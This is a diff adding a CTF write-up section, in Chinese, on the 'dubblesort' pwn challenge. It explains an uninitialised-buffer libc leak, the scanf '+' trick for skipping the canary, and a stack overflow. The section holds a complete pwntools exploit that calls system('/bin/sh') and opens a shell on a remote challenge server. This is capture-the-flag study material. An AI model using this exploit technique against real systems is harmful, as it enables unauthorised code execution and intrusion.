@@ -1811,3 +1811,67 @@ if __name__ == '__main__':
     delete(3)
     io.interactive()
 ```
+
+
+### 20. dubblesort
+题目：暂无
+
+思路：主要漏洞点有两处，一是read读取字符串前未进行初始化且未加0进行截断，二是没有检查输入数组大小。
+
+#### scanf的一个特性
+```c
+scanf("%u", &a);
+scanf("%x", &b);
+scanf("%d", &c);
+```
+如果只输入一个符号，scanf会跳过对变量的输入。
+
+#### 存在的几个坑
+1. 调试的时候使用的glibc-all-in-one,但是实际发现和题目给的libc还是有区别的，因此调试前只用patchelf修改了ld.so,然后通过```io = process('./dubblesort', env={"LD_PRELOAD" : "./libc_32.so.6"})```指定libc文件。
+2. ida分析的栈结构可能不准确，需要实际调试，确定精确的栈结构和需要覆盖的偏移量。
+
+全部源代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF('dubblesort')
+libc = ELF('libc_32.so.6')
+
+debug = False
+if debug:
+    io = process('./dubblesort', env={"LD_PRELOAD" : "./libc_32.so.6"})
+else:
+    io = remote('220.249.52.134', 55072)
+
+offset = 0xf7fcc244 - 0xf7e1e000
+
+if __name__ == '__main__':
+    # leak
+    username = b'A' * 27
+    io.sendlineafter(':', username)
+    data = io.recvuntil(' sort :')
+    print(data)
+    addr = u32(data[34:38])
+    log.info('leak address: 0x%x' % addr)
+
+    # system, /bin/sh
+    libcBase = addr - offset
+    log.info('libc base: 0x%x' % libcBase)
+    systemAddr = libcBase + libc.sym['system']
+    binshAddr = libcBase + next(libc.search(b'/bin/sh\x00'))
+    log.info('system: 0x%x' % systemAddr)
+    log.info('/bin/sh: 0x%x' % binshAddr)
+
+    # input numbers
+    io.sendline('35')
+    for i in range(24):
+        io.sendlineafter(': ', '1')
+    io.sendlineafter(': ', '+')
+    for i in range(9):
+        io.sendlineafter(': ', str(systemAddr))
+    io.sendlineafter(': ', str(binshAddr))
+    # gdb.attach(io)
+    # pause()
+    io.interactive()
+```
